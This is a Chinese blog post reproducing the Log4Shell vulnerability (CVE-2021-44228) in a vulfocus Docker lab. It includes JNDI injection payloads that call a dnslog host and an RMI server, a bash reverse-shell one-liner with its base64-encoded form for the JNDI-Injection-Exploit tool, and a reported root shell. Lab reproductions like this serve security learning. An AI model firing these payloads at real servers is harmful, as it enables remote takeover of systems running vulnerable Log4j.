# 2021-log4j2 漏洞复现 CVE-2021-44228-反弹 shell - 逆向菜狗 - 博客园

> 原文：[`www.cnblogs.com/0x200/p/15692319.html`](https://www.cnblogs.com/0x200/p/15692319.html)

2021-log4j2 漏洞复现 CVE-2021-44228

2021 年 12 月 15 日

12:03

该漏洞是最近新爆出的漏洞能够远程执行 命令：

该镜像本地可以搭建环境：

1、拉取一个 docker 镜像 docker pull vulfocus/log4j2-rce-2021-12-09

2、跑起来 docker run -tid -p 38080:8080 vulfocus/log4j2-rce-2021-12-09

使用 vulfocus 可以搭建好环境：

![](img/4553e2268cb5e78a8ce3f49d862d9854.png)

访问该链接：

[`vulfocus.fofa.so:42044/hello`](http://vulfocus.fofa.so:42044/hello)

之后 POST 传入以下 payload：

payload=${jndi:ldap://wdhcrj.dnslog.cn/exp}

![](img/e02bd086ce2a2f62edfcc6fca0ef9bbf.png)

回显回来了内容 dnslog：

![](img/5e3ef4f029619add17ea3b29f9feef7b.png)

本地搭建环境，将镜像拉下来搭建好环境：

![](img/70105b9a3cd67dcf2f563513c4be396e.png)

之后准备 payload：

bash -i >& /dev/tcp/192.168.19.128/4444 0>&1

在 kali/2021 文件夹种有这个工具生成 payload：

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5LjEyOC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" -A "192.168.19.128"

![](img/78f24f50adc7836955b463c88e887b6d.png)

尝试使用第一个 payload：

payload=${jndi:rmi://192.168.19.128:1099/uctfqw}

再开一个终端可以回弹 shell，有 root 权限：

![](img/c39d2d6c71e42fcb0dbb9506471da095.png)